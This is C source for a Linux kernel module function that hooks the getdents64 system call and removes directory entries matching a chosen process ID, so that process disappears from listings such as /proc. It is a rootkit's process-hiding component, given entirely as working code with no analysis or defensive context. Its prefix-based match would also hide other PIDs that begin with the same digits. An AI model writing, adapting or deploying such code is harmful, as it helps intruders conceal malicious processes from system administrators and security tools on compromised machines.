#include <linux/init.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#include "hide_process.h"

long hide_process(const struct pt_regs *regs,
		  struct linux_dirent64 __user *dirp)
{
	unsigned long err2 = 0;
	long off = 0;

	struct linux_dirent64 *curr = NULL;
	struct linux_dirent64 *dirp_ker = NULL;
	struct linux_dirent64 *prev = NULL;
	
//ret store number of bytes to iterate through
	long ret = orig_getdents64(regs); 
	if (ret <= 0)
		return ret;

	if (strnlen(proc_pid, 255) == 0)
		return ret;

	dirp_ker = kzalloc(ret, GFP_KERNEL);
	if (dirp_ker == NULL) {
		kfree(dirp_ker);
		return ret;
	}

	err2 = copy_from_user(dirp_ker, dirp, ret);
	if (err2) {
		kfree(dirp_ker);
		return ret;
	}
/*
iterating through dirent structs adding offset 
if the desired process is encountered, remove
it by moving dirent structs
*/
	while (off < ret) {
		curr = (void *)dirp_ker + off;
		if (memcmp(proc_pid, curr->d_name, strlen(proc_pid)) == 0){
			if (curr == dirp_ker) {
				ret -= curr->d_reclen;
				memmove(curr,
					(void *)curr +curr->d_reclen, ret);
				continue;
			}
			prev->d_reclen += curr->d_reclen;
		} 
		else
			prev = curr;

		off += curr->d_reclen;
	}
	
	err2 = copy_to_user(dirp, dirp_ker, ret);
	if (err2) {
		kfree(dirp_ker);
		return ret;
	}
	kfree(dirp_ker);
	return ret;
}
